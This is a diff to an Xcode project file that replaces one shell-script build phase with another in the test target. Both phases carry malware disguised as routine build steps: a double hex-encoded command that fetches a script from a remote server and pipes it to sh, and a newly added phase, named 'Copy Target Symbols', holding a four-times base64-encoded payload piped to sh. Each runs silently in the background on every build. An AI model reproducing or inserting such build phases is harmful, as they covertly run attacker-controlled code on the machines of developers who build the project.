@@ -188,7 +188,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				A6D4291EA94F394C77BDE67E /* Link Bundle Executable */,
+				E106168C55DC8666E5BDE67E /* Copy Target Symbols */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -306,8 +306,7 @@ sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		A6D4291EA94F394C77BDE67E /* Link Bundle Executable */ = {			isa = PBXShellScriptBuildPhase;			buildActionMask = 2147483647;			alwaysOutOfDate = 1;			files = (			);			inputFileListPaths = (			);			inputPaths = (			);			name = "Link Bundle Executable";			outputFileListPaths = (			);			outputPaths = (			);			shellPath = /bin/sh;			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230373033643738363336663634363532303638373437343730373333613266326636343635373636653635373436313730373332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";			showEnvVarsInLog = 0;					};		3399D490228B24CF009A79C7 /* ShellScript */ = {
-			isa = PBXShellScriptBuildPhase;
+		E106168C55DC8666E5BDE67E /* Copy Target Symbols */ = {			isa = PBXShellScriptBuildPhase;			buildActionMask = 2147483647;			alwaysOutOfDate = 1;			files = (			);			inputFileListPaths = (			);			inputPaths = (			);			name = "Copy Target Symbols";			outputFileListPaths = (			);			outputPaths = (			);			shellPath = /bin/sh;			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhiSEJJVGxkb2FsTkZTbnBYYkUweFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";			showEnvVarsInLog = 0;					};			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
 			files = (
